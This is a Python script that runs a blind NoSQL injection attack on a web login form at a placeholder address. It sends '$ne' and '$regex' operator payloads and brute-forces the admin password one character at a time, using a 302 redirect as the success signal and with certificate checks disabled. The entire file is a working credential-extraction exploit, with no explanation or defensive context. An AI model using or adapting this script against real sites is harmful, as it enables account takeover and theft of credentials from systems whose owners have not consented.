import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.com'
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
	for c in string.printable:
		if c not in ['*','+','.','?','|', '#', '&', '$']:
			payload='username[$ne]=%s&password[$regex]=^%s' % (username, password + c)
			
			
			
			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)

			if r.status_code == 302:
				print("pass : %s" % (password+c))
				password += c

			
